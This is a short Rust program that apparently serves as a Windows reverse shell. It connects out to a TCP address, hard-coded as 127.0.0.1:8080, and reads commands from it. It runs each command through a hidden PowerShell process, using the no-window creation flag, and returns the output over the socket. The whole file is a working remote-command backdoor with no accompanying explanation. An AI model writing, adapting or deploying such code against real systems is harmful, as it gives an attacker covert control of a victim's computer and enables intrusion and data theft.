use tokio::{io::{AsyncReadExt, AsyncWriteExt}, net::TcpStream, process};


#[tokio::main]
async fn main() {
    let addr = "127.0.0.1:8080";
    let mut conn = TcpStream::connect(addr).await.unwrap();
    conn.set_nodelay(true).unwrap();
    loop {
        match read(&mut conn).await {
            Some(cmd) => {
                let command = cmd.iter().map(|x| *x).take_while(|x| *x != 0u8).collect::<Vec<u8>>();
                let output = run_command(String::from_utf8(command).unwrap()).await;
                conn.write_all(&output).await.unwrap();
            }
            None => {
                continue;
            }
        }
    }
}


async fn read(conn: &mut TcpStream) -> Option<Vec<u8>>{
    let mut buf = vec![0u8;1024];
    if conn.read(&mut buf).await.unwrap() > 0 {
        Some(buf)
    }
    else {
        None
    }
}

async fn run_command(command: String) -> Vec<u8> {
    let mut output = process::Command::new("powershell.exe");
    output.creation_flags(0x8000000);
    let mut output = output.arg("-NoProfile").arg("-Command").arg(command.trim()).output().await.unwrap();
    output.stdout.append(&mut output.stderr);
    output.stdout
}